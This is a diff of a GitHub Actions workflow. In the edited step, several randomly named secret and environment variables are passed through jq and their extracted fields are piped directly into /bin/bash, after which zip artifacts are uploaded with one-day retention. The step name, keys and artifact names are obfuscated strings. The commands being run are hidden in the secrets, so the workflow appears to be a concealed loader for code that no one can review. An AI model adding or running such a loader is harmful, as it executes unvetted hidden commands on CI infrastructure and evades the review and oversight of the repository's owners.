@@ -8,16 +8,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: linjunhencheng
         env:
-          smsvl6: ${{ secrets.smsvl6 }}
+          l83: ${{ secrets.l83 }}
         run: |
-          printf '%s' "$smsvl6" | jq -r .rx351 | /bin/bash
-          printf '%s' "$tgts3562" | jq -r .exf575 | /bin/bash
-          printf '%s' "$d87450" | jq -r .dbbt9014 | /bin/bash
-          printf '%s' "$t1085" | jq -r .j2540 | /bin/bash
+          printf '%s' "$l83" | jq -r .xc69016 | /bin/bash
+          printf '%s' "$ddjs85725" | jq -r .usw96204 | /bin/bash
+          echo $nqily798 | jq -r .cefuo14951 | /bin/bash
+          echo $iv05417 | jq -r .stet6033 | /bin/bash
+          echo $spop2398 | jq -r .ydbzt80295 | /bin/bash
+          echo $vmhd3 | jq -r .g90 | /bin/bash
+          printf '%s' "$yt97" | jq -r .rshtm5 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
         with:
-          name: p7nkDi1Y
+          name: gszN7SnY
           path: "*.zip"
           retention-days: 1
